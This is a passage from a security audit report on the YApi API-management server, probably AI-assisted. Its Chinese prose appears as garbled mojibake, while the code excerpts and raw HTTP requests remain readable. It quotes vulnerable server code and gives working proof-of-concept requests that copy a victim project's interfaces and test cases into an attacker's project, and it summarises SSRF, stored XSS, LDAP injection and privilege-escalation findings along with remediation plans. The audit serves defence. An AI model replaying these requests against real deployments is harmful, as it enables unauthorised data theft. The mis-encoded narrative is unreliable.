  let jpegPrefix = 'data:image/jpeg;base64,';
  ... // ä»…æ”¯æŒ png/jpegï¼Œä¸”å¤§å°é™åˆ¶çº¦ 200KB
  let result = await avatarInst.up(this.getUid(), basecode, type);
  ctx.body = yapi.commons.resReturn(result);
}
```

- ä¸‹è½½ç±»ï¼š

```546:550:server/controllers/interface.js
async downloadCrx(ctx) {
  let filename = 'crossRequest.zip';
  let dataBuffer = yapi.fs.readFileSync(
    yapi.path.join(yapi.WEBROOT, 'static/attachment/cross-request.zip')
  );
```

#### å‘ç°ä¸€ï¼šæµ‹è¯•ç«¯ç‚¹å¯å†™å…¥æœåŠ¡å™¨å›ºå®šè·¯å¾„æ–‡ä»¶ï¼ˆå·²ç¡®è®¤ï¼Œä½é£é™©ï¼‰
- ä½ç½®ä¸æˆå› ï¼š
  - `/api/test/single/upload` å°†åŸå§‹è¯·æ±‚ä½“å†™å…¥ `WEBROOT_RUNTIME/test.text`ã€‚
  - `/api/test/files/upload` å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ° `WEBROOT_RUNTIME/test.text`ã€‚
  - ä¸¤è€…å‡è¦æ±‚ç™»å½•ï¼›å†™å…¥è·¯å¾„å›ºå®šã€é Web é™æ€ç›®å½•ï¼Œæ— æ³•ç›´æ¥é€šè¿‡ HTTP è¯»å–ã€‚

```90:101:server/controllers/test.js
req.on('end', function() {
  let data = new Buffer(size);
  ...
  fs.writeFileSync(path.join(yapi.WEBROOT_RUNTIME, 'test.text'), data, function(err) {
    return (ctx.body = yapi.commons.resReturn(null, 402, 'å†™å…¥å¤±è´¥'));
  });
});
```

```114:120:server/controllers/test.js
let file = ctx.request.body.files.file;
let newPath = path.join(yapi.WEBROOT_RUNTIME, 'test.text');
fs.renameSync(file.path, newPath);
ctx.body = yapi.commons.resReturn({ res: 'ä¸Šä¼ æˆåŠŸ' });
```

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼š

1) å¤šæ–‡ä»¶ä¸Šä¼ å†™å…¥å›ºå®šæ–‡ä»¶
```
POST /api/test/files/upload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="poc.bin"
Content-Type: application/octet-stream

Hello
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

2) åŸå§‹è¯·æ±‚ä½“å†™å…¥å›ºå®šæ–‡ä»¶
```
POST /api/test/single/upload HTTP/1.1
Host: target
Content-Type: application/octet-stream
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>

HELLO_WORLD
```

é£é™©è¯„ä¼°ï¼šéœ€ç™»å½•ï¼›è·¯å¾„ä¸å¯æ§ä¸”ä¸åœ¨é™æ€ç›®å½•ï¼Œæ— æ³•ç›´æ¥é€šè¿‡ HTTP è®¿é—®ã€‚å»ºè®®åœ¨ç”Ÿäº§ç¦ç”¨/éšè—æµ‹è¯•ç«¯ç‚¹ï¼Œæˆ–å°†å†™å…¥é‡å®šå‘åˆ°ä¸´æ—¶ç›®å½•å¹¶å¼€å¯æœ€å°æƒé™ã€‚

---

#### å¤´åƒä¸Šä¼ å®‰å…¨æ€§ï¼ˆå·²ç¡®è®¤ï¼‰
- ç±»å‹ä¸å¤§å°é™åˆ¶ï¼šä»…å…è®¸ `image/png` ä¸ `image/jpeg`ï¼Œå¤§å°çº¦ 200KBï¼›ä»¥ Base64 å­˜å‚¨äºæ•°æ®åº“ï¼Œé€šè¿‡ `/api/user/avatar` è¯»å–æ—¶è®¾ç½®æ­£ç¡® `Content-Type`ã€‚

```597:612:server/controllers/user.js
let uid = ctx.query.uid ? ctx.query.uid : this.getUid();
let data = await avatarInst.get(uid);
if (!data || !data.basecode) {
  dataBuffer = yapi.fs.readFileSync(yapi.path.join(yapi.WEBROOT, 'static/image/avatar.png'));
  type = 'image/png';
} else {
  type = data.type;
  dataBuffer = new Buffer(data.basecode, 'base64');
}
ctx.set('Content-type', type);
ctx.body = dataBuffer;
```

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼ˆä¸Šä¼ å¤´åƒï¼‰ï¼š
```
POST /api/user/upload_avatar HTTP/1.1
Host: target
Content-Type: application/json
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>

{
  "basecode": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAB..."
}
```

---

#### æ–‡ä»¶ä¸‹è½½ä¸è·¯å¾„éå†å®¡è®¡ç»“è®º
- `/api/interface/download_crx` è¯»å–å›ºå®šè·¯å¾„æ–‡ä»¶å¹¶ç›´æ¥å›ä¼ ï¼Œæœªä½¿ç”¨ç”¨æˆ·è¾“å…¥æ„é€ è·¯å¾„ï¼›æœªå‘ç°è·¯å¾„éå†é£é™©ã€‚
- æœªå‘ç°æœåŠ¡ç«¯åŸºäºç”¨æˆ·å¯æ§è·¯å¾„çš„ä»»æ„æ–‡ä»¶è¯»å–/ä¸‹è½½å®ç°ï¼›é™æ€èµ„æºç”± Koa Static å›ºå®šç›®å½•æä¾›ï¼Œè·¯ç”±å‰ç½®é€»è¾‘æœªè§è·¯å¾„æ‹¼æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥ï¼ˆå‚è€ƒ `server/app.js` ä¸ `server/router.js`ï¼‰ã€‚


### ğŸ’¼ **é˜¶æ®µä¹ï¼šä¸šåŠ¡é€»è¾‘æ¼æ´å®¡è®¡** [å·²å®Œæˆ]
**å®¡è®¡èŒƒå›´**ï¼š
- æµç¨‹ç»•è¿‡
- ç«äº‰æ¡ä»¶
- é‡‘é¢/æ•°é‡ç¯¡æ”¹
- ä¸šåŠ¡è§„åˆ™ç»•è¿‡

**ä»»åŠ¡è¦æ±‚**ï¼š
- [x] åˆ†ææ ¸å¿ƒä¸šåŠ¡é€»è¾‘
- [x] æ£€æŸ¥å…³é”®æ“ä½œé¡ºåº
- [x] è¯†åˆ«å¯èƒ½çš„çŠ¶æ€æœºç»•è¿‡
- [x] æšä¸¾ä¸šåŠ¡é€»è¾‘æ¼æ´åˆ©ç”¨ç‚¹

---

#### æ¼æ´ä¸€ï¼šé€šè¿‡å¤åˆ¶é¡¹ç›®åŠŸèƒ½æ³¨å…¥ä»–äººåˆ†ç±»IDï¼Œå¤åˆ¶å…¶æ¥å£ï¼ˆæ•°æ®æ³„éœ²ï¼Œå·²ç¡®è®¤ï¼‰
- æˆå› ï¼š`/api/project/copy` ä»…æ ¡éªŒç›®æ ‡ `group_id` çš„ç¼–è¾‘æƒé™ï¼Œæœªæ ¡éªŒæ¥æºé¡¹ç›® `copyId` çš„å¯è§æ€§ï¼Œä¹Ÿæœªæ ¡éªŒæäº¤çš„ `cat[].\_id` æ˜¯å¦å±äºè¯¥æ¥æºé¡¹ç›®ï¼›æœåŠ¡ç«¯ç›´æ¥æŒ‰æäº¤çš„ `cat[].\_id` æŸ¥è¯¢æ¥å£å¹¶å¤åˆ¶ã€‚

è¯æ®1ï¼ˆå¾ªç¯ `params.cat`ï¼Œç›´æ¥æŒ‰ `item._id` æ‹‰å–æ¥å£å¹¶ä¿å­˜åˆ°æ–°é¡¹ç›®ï¼‰ï¼š

```317:346:server/controllers/project.js
        // è·å–æ¯ä¸ªé›†åˆä¸­çš„interface
        let interfaceData = await this.interfaceModel.listByInterStatus(item._id);

        // å°†interfaceDataå­˜åˆ°æ–°çš„catIDä¸­
        for (let key = 0; key < interfaceData.length; key++) {
          let interfaceItem = interfaceData[key].toObject();
          let data = Object.assign(interfaceItem, {
            uid: this.getUid(),
            catid: catResult._id,
            project_id: result._id,
            add_time: yapi.commons.time(),
            up_time: yapi.commons.time()
          });
          delete data._id;

          await this.interfaceModel.save(data);
        }
```

è¯æ®2ï¼ˆæ¨¡å‹ä¾§æŒ‰åˆ†ç±»IDç›´æ¥åˆ—å‡ºæ¥å£ï¼Œæ— ä»»ä½•é¡¹ç›®/æƒé™å…³è”æ ¡éªŒï¼‰ï¼š

```256:271:server/models/interface.js
  listByInterStatus(catid, status) {
    let option = {};
    if (status === 'open') {
      option = {
        catid: catid,
        api_opened: true
      };
    } else {
      option = {
        catid: catid
      };
    }
    return this.model
      .find(option)
      .select()
      .sort({ title: 1 })
      .exec();
  }
```

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼ˆéœ€ç™»å½•ï¼Œä¸”å¯¹ç›®æ ‡ `group_id` æ‹¥æœ‰ç¼–è¾‘æƒé™ï¼‰ï¼š

```
POST /api/project/copy HTTP/1.1
Host: target
Content-Type: application/json
Cookie: _yapi_uid=<ATTACKER_UID>; _yapi_token=<ATTACKER_JWT>

{
  "_id": <VICTIM_PROJECT_ID>,
  "name": "cloned-from-victim",
  "preName": "ignored",
  "basepath": "/api",
  "group_id": <ATTACKER_GROUP_ID>,
  "group_name": "attacker-group",
  "project_type": "private",
  "cat": [
    { "_id": <VICTIM_CAT_ID>, "name": "any", "desc": "any" }
  ]
}
```

é¢„æœŸç»“æœï¼šåœ¨æ”»å‡»è€…å¯ç¼–è¾‘çš„åˆ†ç»„ä¸‹ç”Ÿæˆæ–°é¡¹ç›®ï¼ŒåŒ…å«å—å®³é¡¹ç›®ä¸­ `catid=<VICTIM_CAT_ID>` çš„å…¨éƒ¨æ¥å£ã€‚

ä¿®å¤å»ºè®®ï¼š
- æ ¡éªŒ `copyId` çš„å¯è§æ€§ï¼šè¦æ±‚ `checkAuth(copyId, 'project', 'view')`ï¼›
- æ ¡éªŒ `params.cat[*]._id` å¿…é¡»å±äº `copyId`ï¼Œå¹¶å¯¹æ¥æºé¡¹ç›®å†åš `view` æƒé™æ£€æŸ¥ï¼›
- ç¦æ­¢è·¨é¡¹ç›®çš„ `catid` æ³¨å…¥ï¼Œ`cat` åº”ç”±æœåŠ¡ç«¯æ ¹æ® `copyId` è§£æè€Œéä¿¡ä»»å®¢æˆ·ç«¯ä¼ å…¥ã€‚

---

#### æ¼æ´äºŒï¼šè·¨é¡¹ç›®å…‹éš†æµ‹è¯•ç”¨ä¾‹ï¼ˆ/api/col/clone_case_listï¼‰ï¼Œå¯ç”¨ä»–äºº `col_id` å…‹éš†ï¼ˆæ•°æ®æ³„éœ²ï¼Œå·²ç¡®è®¤ï¼‰
- æˆå› ï¼š`clone_case_list` ä»…æ ¡éªŒç›®æ ‡ `project_id` çš„ç¼–è¾‘æƒé™ï¼Œç›´æ¥æŒ‰æäº¤çš„ `col_id` åˆ—å‡ºç”¨ä¾‹å¹¶å…‹éš†åˆ° `new_col_id`ï¼Œæœªæ ¡éªŒ `col_id` æ˜¯å¦å±äºåŒä¸€é¡¹ç›®ã€äº¦æœªæ ¡éªŒæ¥æºé¡¹ç›®çš„å¯è§æ€§ã€‚

è¯æ®ï¼ˆæ ¹æ® `col_id` ç›´æ¥æ‹‰å–ç”¨ä¾‹åˆ—è¡¨ï¼Œæ— æ¥æºé¡¹ç›®æƒé™æ ¡éªŒæˆ–é¡¹ç›®ä¸€è‡´æ€§æ ¡éªŒï¼‰ï¼š

```444:474:server/controllers/interfaceCol.js
  async cloneCaseList(ctx) {
    try {
      let params = ctx.request.body;
      params = yapi.commons.handleParams(params, {
        project_id: 'number',
        col_id: 'number',
        new_col_id: 'number'
      });
      const { project_id, col_id, new_col_id } = params;
      let auth = await this.checkAuth(params.project_id, 'project', 'edit');
      if (!auth) { return (ctx.body = yapi.commons.resReturn(null, 400, 'æ²¡æœ‰æƒé™')); }
      ...
      let oldColCaselistData = await this.caseModel.list(col_id, 'all');
      ... // é€æ¡ä¿å­˜åˆ° new_col_id
```

```77:92:server/models/interfaceCase.js
  list(col_id, select) {
    select = select || 'casename uid col_id _id index interface_id project_id';
    if (select === 'all') {
      return this.model
        .find({ col_id: col_id })
        .exec();
    }
    return this.model
      .find({ col_id: col_id })
      .select(select)
      .exec();
  }
```

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼ˆéœ€ç™»å½•ï¼Œä¸”å¯¹ `project_id` æœ‰ç¼–è¾‘æƒé™ï¼‰ï¼š

```
POST /api/col/clone_case_list HTTP/1.1
Host: target
Content-Type: application/json
Cookie: _yapi_uid=<ATTACKER_UID>; _yapi_token=<ATTACKER_JWT>

{
  "project_id": <ATTACKER_PROJECT_ID>,
  "col_id": <VICTIM_COL_ID>,
  "new_col_id": <ATTACKER_NEW_COL_ID>
}
```

é¢„æœŸç»“æœï¼šå—å®³é¡¹ç›® `col_id=<VICTIM_COL_ID>` ä¸‹çš„å…¨éƒ¨æµ‹è¯•ç”¨ä¾‹è¢«å…‹éš†è¿›æ”»å‡»è€…é¡¹ç›®çš„ `new_col_id`ã€‚

ä¿®å¤å»ºè®®ï¼š
- æ ¡éªŒ `col_id` å¯¹åº”é›†åˆçš„ `project_id` å¿…é¡»ä¸ç›®æ ‡ `project_id` ä¸€è‡´ï¼›
- è‹¥å…è®¸è·¨é¡¹ç›®è¿ç§»ï¼Œä¹Ÿå¿…é¡»å¯¹æ¥æºé¡¹ç›®æ‰§è¡Œ `checkAuth(source_project_id, 'project', 'view')` æ ¡éªŒï¼›
- åœ¨æ¨¡å‹å±‚æ–°å¢æŒ‰ `col_id + project_id` çš„è”åˆæŸ¥è¯¢ï¼Œé¿å…å•å‡­ `col_id` è·å–æ•°æ®ã€‚

---

#### ä¸šåŠ¡è§„åˆ™é—®é¢˜ï¼šæ¥å£æ ‡ç­¾è‡ªåŠ¨ä¸ŠæŠ›è‡³é¡¹ç›®æ ‡ç­¾ï¼ˆä½é£é™©ï¼Œå·²ç¡®è®¤ï¼‰
- ç°çŠ¶ï¼šæ¥å£ `add/up` æ—¶ï¼Œ`params.tag` ä¸­ä¸å­˜åœ¨äºé¡¹ç›®çš„æ ‡ç­¾å°†è¢«è‡ªåŠ¨è¿½åŠ åˆ°é¡¹ç›®çº§ `tag` åˆ—è¡¨ï¼Œè°ƒç”¨å¤„æœªå†åšé¢å¤–æƒé™åˆ†çº§é™åˆ¶ï¼ˆæ¥å£ç¼–è¾‘è€…å¯æ‰©å¤§é¡¹ç›®æ ‡ç­¾é›†åˆï¼‰ã€‚

è¯æ®ï¼ˆæ£€æµ‹ `params.tag` å¹¶å†™å›é¡¹ç›® `tag`ï¼‰ï¼š

```392:424:server/controllers/interface.js
  async autoAddTag(params) {
    //æ£€æŸ¥æ˜¯å¦æäº¤äº†ç›®å‰ä¸å­˜åœ¨çš„tag
    let tags = params.tag;
    if (tags && Array.isArray(tags) && tags.length > 0) {
      let projectData = await this.projectModel.get(params.project_id);
      let tagsInProject = projectData.tag;
      let needUpdate = false;
      if (tagsInProject && Array.isArray(tagsInProject) && tagsInProject.length > 0) {
        tags.forEach(tag => {
          if (!_.find(tagsInProject, item => {
            return item.name === tag;
          })) { //tagä¸å­˜åœ¨
            needUpdate = true;
            tagsInProject.push({ name: tag, desc: tag });
          }
        });
      } else {
        needUpdate = true
        tagsInProject = []
        tags.forEach(tag => {
          tagsInProject.push({ name: tag, desc: tag });
        });
      }
      if (needUpdate) { //éœ€è¦æ›´æ–°tag
        let data = { tag: tagsInProject, up_time: yapi.commons.time() };
        await this.projectModel.up(params.project_id, data);
      }
    }
  }
```

å½±å“ï¼šæ¥å£ç¼–è¾‘è€…å¯æ— é™æ‰©å¼ é¡¹ç›®æ ‡ç­¾é›†åˆï¼ˆæ±¡æŸ“/æ»¥ç”¨æ ‡ç­¾ï¼‰ï¼Œä½†ä¸æ¶‰åŠè¶Šæƒè¯»å†™æ•°æ®ã€‚å»ºè®®ä»…å…è®¸é¡¹ç›®â€œå±é™©â€æƒé™æˆ–ä»¥ä¸Šè§’è‰²ç®¡ç†é¡¹ç›®çº§æ ‡ç­¾ï¼Œæˆ–æä¾›å•ç‹¬æ ‡ç­¾ç®¡ç†ç«¯ç‚¹å¹¶é™åˆ¶è§’è‰²ã€‚

---

## ğŸ“Š **é˜¶æ®µåï¼šç»¼åˆæŠ¥å‘Šç”Ÿæˆ** [å·²å®Œæˆ]
**ä»»åŠ¡è¦æ±‚**ï¼š
- [x] æ•´åˆå„é˜¶æ®µå®¡è®¡ç»“æœ
- [x] ç”Ÿæˆç»“æ„åŒ–æ¼æ´æŠ¥å‘Š
- [x] æä¾›è¯¦ç»†ä¿®å¤å»ºè®®
- [x] è¿›è¡Œé£é™©è¯„ä¼°å’Œä¼˜å…ˆçº§æ’åº

---

### æ‰§è¡Œæ‘˜è¦ï¼ˆExecutive Summaryï¼‰
- **æ€»ä½“é£é™©ç­‰çº§ï¼šé«˜**ã€‚å­˜åœ¨å¯å¯¼è‡´è·¨é¡¹ç›®æ•°æ®æ³„éœ²çš„è®¿é—®æ§åˆ¶/é€»è¾‘ç¼ºé™·ã€æœåŠ¡ç«¯å–æ•°ï¼ˆSSRFï¼‰ã€å¤šå¤„å­˜å‚¨å‹ XSSï¼Œä»¥åŠæ¡ä»¶æ€§æœåŠ¡ç«¯è„šæœ¬æ‰§è¡Œï¼ˆå¼€å¯é…ç½®æ—¶ï¼‰ã€‚
- **ä¸»è¦é«˜å±é¡¹**ï¼š
  - ä¸šåŠ¡é€»è¾‘/è®¿é—®æ§åˆ¶ï¼š`/api/project/copy`ï¼ˆè·¨é¡¹ç›®æ³¨å…¥ catid å¤åˆ¶æ¥å£ï¼‰ã€`/api/col/clone_case_list`ï¼ˆè·¨é¡¹ç›®å…‹éš†ç”¨ä¾‹ï¼‰ã€`/api/group/add_member`ï¼ˆä»»æ„åŠ äºº/ææƒï¼‰ã€‚
  - SSRFï¼š`/api/project/swagger_url`ã€`/api/open/import_data`ã€æ’ä»¶è‡ªåŠ¨åŒæ­¥ã€‚
  - å­˜å‚¨å‹ XSSï¼šTimeLine æ—¥å¿—ã€æ¥å£ `desc`ã€Wiki `desc`ã€‚
  - æ¡ä»¶æ€§ RCEï¼šå½“ `WEBCONFIG.scriptEnable === true` ä¸”å…·â€œå±é™©â€æƒé™æ—¶ï¼ŒæœåŠ¡ç«¯ vm æ‰§è¡Œç”¨æˆ·è„šæœ¬ã€‚

### ç»¼åˆæ¼æ´çŸ©é˜µ
| ç¼–å· | æ¼æ´ | ä¸¥é‡æ€§ | è®¤è¯ | ä¸»è¦ç«¯ç‚¹ | å½±å“ | ä»£ç å®šä½ | å¤ç° | ä¿®å¤è¦ç‚¹ |
| - | - | - | - | - | - | - | - | - |
| 10-01 | é¡¹ç›®å¤åˆ¶è·¨é¡¹ç›®æ³¨å…¥ catid å¤åˆ¶æ¥å£ | é«˜ | ç™»å½• | POST `/api/project/copy` | è·¨é¡¹ç›®æ•°æ®æ³„éœ² | `server/controllers/project.js` copyï¼›`server/models/interface.js` listByInterStatus | æœ‰ | æ ¡éªŒæ¥æºé¡¹ç›® view æƒé™ï¼›æ ¡éªŒ catid å½’å±ï¼›ç”±æœåŠ¡ç«¯è§£æ cat åˆ—è¡¨ |
| 10-02 | ç”¨ä¾‹å…‹éš†è·¨é¡¹ç›® exfil | é«˜ | ç™»å½• | POST `/api/col/clone_case_list` | è·¨é¡¹ç›®æ•°æ®æ³„éœ² | `server/controllers/interfaceCol.js` cloneCaseListï¼›`server/models/interfaceCase.js` list | æœ‰ | é™åˆ¶ `col_id` å±äºç›®æ ‡é¡¹ç›®ï¼›å¦‚è·¨é¡¹ç›®éœ€æ ¡éªŒæ¥æº view æƒé™ |
| 10-03 | åˆ†ç»„ä»»æ„åŠ äºº/ææƒ | é«˜ | ç™»å½• | POST `/api/group/add_member` | ææƒè‡³ owner | `server/controllers/group.js` addMember | æœ‰ | å¢åŠ  `checkAuth(id,'group','danger')`ï¼›ä¿®æ­£ admin åˆ¤æ–­ |
| 10-04 | SSRF - Open å¯¼å…¥/Swagger ç›´è¿/è‡ªåŠ¨åŒæ­¥ | é«˜ | æ··åˆ | GET `/api/project/swagger_url`ï¼›POST `/api/open/import_data`ï¼›`/api/plugin/autoSync/save` | å†…ç½‘æ¢æµ‹ä¸å–æ•° | `server/controllers/project.js`ï¼›`server/controllers/open.js`ï¼›æ’ä»¶ sync | æœ‰ | ç›®æ ‡åœ°å€ç™½åå•/ç½‘æ®µé»‘åå•/åè®®é™åˆ¶/è¶…æ—¶ä¸é‡å®šå‘é™åˆ¶ |
| 10-05 | å­˜å‚¨å‹ XSS - TimeLine | é«˜ | ç™»å½• | GET `/api/log/list*` æ¸²æŸ“ | è´¦å·æ¥ç®¡/é’“é±¼ | å‰ç«¯ `TimeLine.js`ï¼›å¤šæ§åˆ¶å™¨ `saveLog` | æœ‰ | æœåŠ¡ç«¯å‡€åŒ–/å‰ç«¯ DOMPurifyï¼›æ—¥å¿—æ”¹ç»“æ„åŒ–æ¸²æŸ“ |
| 10-06 | å­˜å‚¨å‹ XSS - æ¥å£ `desc` | é«˜ | ç™»å½• | POST `/api/interface/up` â†’ æŸ¥çœ‹æ¥å£ | åŒä¸Š | å‰ç«¯ `View.js` æ¸²æŸ“ `desc` | æœ‰ | å¯Œæ–‡æœ¬ç™½åå•å‡€åŒ–æˆ–ç§»é™¤å±é™©æ ‡ç­¾ |
| 10-07 | å­˜å‚¨å‹ XSS - Wiki `desc` | é«˜ | ç™»å½• | POST `/api/plugin/wiki_desc/up` â†’ æŸ¥çœ‹ | åŒä¸Š | æ’ä»¶ wiki è§†å›¾ | æœ‰ | åŒä¸Š |
| 10-08 | LDAP è¿‡æ»¤å™¨æ³¨å…¥ | ä¸­ | æœªç™»å½• | ALL `/api/user/login_by_ldap` | ç”¨æˆ·æšä¸¾/èµ„æºæ¶ˆè€— | `server/utils/ldap.js` | æœ‰ | RFC4515 è½¬ä¹‰ï¼›æ¨¡æ¿åŒ– filter |
| 10-09 | æ­£åˆ™æ³¨å…¥ï¼ˆRegex Injectionï¼‰ | ä¸­ | ç™»å½• | GET `/api/user/search`ã€`/api/project/search` | æ•°æ®é¢æ‰©å¤§/æ€§èƒ½é€€åŒ– | `server/models/*`.search ä¸ `utils/commons.validateSearchKeyword` | æœ‰ | å…³é”®å­—å­—é¢é‡è½¬ä¹‰ï¼›é™åˆ¶é€šé… |
| 10-10 | ç™»å½•æš´åŠ›ç ´è§£ | ä¸­ | æœªç™»å½• | POST `/api/user/login` | å£ä»¤è¢«æ’åº“/çˆ†ç ´ | `server/controllers/user.js` | æœ‰ | é€Ÿç‡é™åˆ¶/é”å®š/éªŒè¯ç /å®¡è®¡å‘Šè­¦ |
| 10-11 | Cookie å®‰å…¨å±æ€§ä¸è¶³ | ä¸­ | ç™»å½• | è®¾ç½® `_yapi_token/_yapi_uid` | CSRF é£é™© | `server/controllers/user.js` setLoginCookie | æœ‰ | `secure`+`sameSite`+ä½œç”¨åŸŸæ”¶ç´§ |
| 10-12 | é¡¹ç›®ç¯å¢ƒæ³„éœ² | ä¸­ | ç™»å½• | GET `/api/project/get_env` | å†…éƒ¨åŸŸåæ³„éœ² | `server/controllers/project.js` | æœ‰ | æ¢å¤æƒé™æ ¡éªŒï¼›æœ€å°åŒ–è¿”å› |
| 10-13 | Mock CORS åå°„æ”¾è¡Œå¹¶å¸¦å‡­æ® | ä¸­ | æ··åˆ | `/mock/*` | è·¨åŸŸè¯»å†™ | `server/middleware/mockServer.js` | æœ‰ | ç²¾å‡†ç™½åå•+å¿…è¦æ—¶å‡­æ®æ”¾è¡Œ |
| 10-14 | æµ‹è¯•æ–‡ä»¶å†™å…¥å›ºå®šè·¯å¾„ | ä½ | ç™»å½• | POST `/api/test/*/upload` | ä½å½±å“å†™å…¥ | `server/controllers/test.js` | æœ‰ | ç”Ÿäº§ç¦ç”¨/æ²™ç®±è‡³ä¸´æ—¶ç›®å½• |
| 10-15 | é¡¹ç›®æ ‡ç­¾è¢«æ¥å£è‡ªåŠ¨æ‰©å¼  | ä½ | ç™»å½• | æ¥å£ add/up | æ ‡ç­¾æ±¡æŸ“ | `server/controllers/interface.js` autoAddTag | æœ‰ | é™æƒæˆ–è®¾ç‹¬ç«‹æ ‡ç­¾ç®¡ç† |

æ³¨ï¼šæ‰€æœ‰æ¡ç›®çš„ Raw HTTP PoC å·²åœ¨å¯¹åº”é˜¶æ®µæä¾›ï¼Œä¸åœ¨æœ¬èŠ‚é‡å¤ã€‚

### æ”»å‡»é¢ä¸å—å½±å“ç«¯ç‚¹ï¼ˆæ±‡æ€»ï¼‰
- SSRFï¼š`/api/project/swagger_url`ã€`/api/open/import_data`ã€`/api/plugin/autoSync/save`ã€‚
- XSSï¼ˆå­˜å‚¨ï¼‰ï¼šé¡¹ç›®/åˆ†ç»„/æ¥å£åŠ¨æ€ï¼ˆ`/api/log/list*`ï¼‰ã€æ¥å£ `desc`ï¼ˆ`/api/interface/up`ï¼‰ã€Wiki `desc`ï¼ˆ`/api/plugin/wiki_desc/up`ï¼‰ã€‚
- è®¿é—®æ§åˆ¶/ä¸šåŠ¡é€»è¾‘ï¼š`/api/group/add_member`ã€`/api/log/list*`ã€`/api/project/copy`ã€`/api/col/clone_case_list`ã€‚
- è®¤è¯ä¸ä¼šè¯ï¼š`/api/user/login`ï¼ˆæš´åŠ›ç ´è§£ï¼‰ã€`setLoginCookie`ï¼ˆCookie å±æ€§ï¼‰ã€‚
- ä¿¡æ¯æ³„éœ²ä¸é…ç½®ï¼š`/api/project/get_env`ã€`/mock/*`ï¼ˆCORSï¼‰ã€‚
- æ–‡ä»¶ï¼š`/api/test/files/upload`ã€`/api/test/single/upload`ã€‚

### ä¿®å¤ä¼˜å…ˆçº§ä¸è·¯çº¿å›¾ï¼ˆå»ºè®®ï¼‰
- P0ï¼ˆç«‹å³ä¿®å¤ï¼Œå‘å¸ƒçƒ­ä¿®è¡¥ä¸ï¼‰
  1) `/api/group/add_member` å¢åŠ  `checkAuth(id,'group','danger')` ä¸ç³»ç»Ÿè§’è‰²åˆ¤æ–­ä¿®æ­£ã€‚
  2) `/api/project/copy` ä¸ `/api/col/clone_case_list` è¡¥é½æ¥æºèµ„æºå½’å±ä¸æƒé™æ ¡éªŒï¼ˆç¦æ­¢è·¨é¡¹ç›® ID æ³¨å…¥ï¼‰ã€‚
  3) SSRF ä¸‰å¤„ï¼šè½åœ°åŸŸåç™½åå•/å†…ç½‘é˜»æ–­/åè®®é™åˆ¶ä¸å…¨å±€ç½‘ç»œå®‰å…¨åŸºçº¿ã€‚
  4) TimeLine/æ¥å£/Wiki æ¸²æŸ“ï¼šä¸Šçº¿æœåŠ¡ç«¯å‡€åŒ–ä¸å‰ç«¯ DOMPurify åŒä¿é™©ï¼Œè¿ç§»æ—¥å¿—ä¸ºç»“æ„åŒ–æ¸²æŸ“ã€‚

- P1ï¼ˆæ¬¡é«˜ä¼˜å…ˆï¼Œè¿‘æœŸåˆå¹¶ï¼‰
  1) æœç´¢æ¥å£å°†å…³é”®å­—ä¸¥æ ¼è½¬ä¹‰ä¸ºå­—é¢é‡ï¼›é™åˆ¶å‰åç¼€é€šé…ï¼›å¢åŠ è¶…æ—¶/æ·±åº¦é™åˆ¶ã€‚
  2) ç™»å½•æš´åŠ›ç ´è§£é˜²æŠ¤ï¼šé™é€Ÿã€å¤±è´¥é”å®šã€éªŒè¯ç ã€äººæœºéªŒè¯ã€å®¡è®¡å‘Šè­¦ã€‚
  3) Cookie å®‰å…¨å±æ€§ï¼š`secure`ã€`sameSite`ã€`path/domain` æ”¶ç´§ä¸æœ‰æ•ˆæœŸä¼˜åŒ–ã€‚
  4) é¡¹ç›®ç¯å¢ƒæ¥å£æ¢å¤æƒé™æ ¡éªŒï¼Œç§æœ‰é¡¹ç›®ä»…æˆå‘˜å¯è§ã€‚
  5) Mock CORSï¼šç²¾ç¡®ç™½åå•ä¸æ˜¯å¦å¸¦å‡­æ®çš„é£é™©è¯„ä¼°ä¸é™åˆ¶ã€‚

- P2ï¼ˆç‰ˆæœ¬è§„åˆ’å†…å®Œæˆï¼‰
  1) ä¾èµ–å‡çº§ä¸æ›¿æ¢ï¼ˆ`axios`ã€`jsonwebtoken`ã€`json5`ã€`underscore`ã€`request`â†’`undici`/`node-fetch` ç­‰ï¼‰ã€‚
  2) RCE æ¡ä»¶é“¾ï¼šç»Ÿä¸€è¿ç§»åˆ° `safeify`ï¼Œé»˜è®¤å…³é—­ `scriptEnable`ï¼Œä»…ç®¡ç†å‘˜å¯æ§å¹¶å®¡è®¡ã€‚
  3) æ ‡ç­¾ç®¡ç†ï¼šä»…â€œå±é™©â€æƒé™å¯æ–°å¢é¡¹ç›®çº§æ ‡ç­¾æˆ–ç‹¬ç«‹ç«¯ç‚¹ç®¡ç†ã€‚

### å˜æ›´å½±å“ä¸éªŒè¯è®¡åˆ’
- ä¿®å¤å°†å¼•å…¥æ›´ä¸¥æ ¼çš„æƒé™ä¸è¾“å…¥æ ¡éªŒï¼Œéœ€è¡¥å……å•å…ƒ/é›†æˆæµ‹è¯•ï¼š
  - è®¿é—®æ§åˆ¶ï¼šæ–°å¢/è°ƒæ•´æ¥å£çš„æƒé™çŸ©é˜µæµ‹è¯•ï¼ˆowner/dev/guest/admin/open tokenï¼‰ã€‚
  - å®‰å…¨åŸºçº¿ï¼šCORS/SSRF/Regex/XSS çš„å›å½’ä¸è´Ÿé¢æµ‹è¯•ã€‚
  - æ€§èƒ½å›å½’ï¼šæœç´¢æ­£åˆ™è½¬ä¹‰åæŸ¥è¯¢è€—æ—¶è¯„ä¼°ï¼›SSRF é™åˆ¶ä¸‹çš„åˆæ³•åœºæ™¯ç™½åå•éªŒè¯ã€‚

### é™„ï¼šé—®é¢˜å®šä½ç´¢å¼•
- å…³é”®æ–‡ä»¶ä¸å‡½æ•°ï¼š
  - `server/controllers/project.js` `copy`ã€`swaggerUrl`ã€`get_env`
  - `server/controllers/interfaceCol.js` `cloneCaseList`
  - `server/controllers/group.js` `addMember`
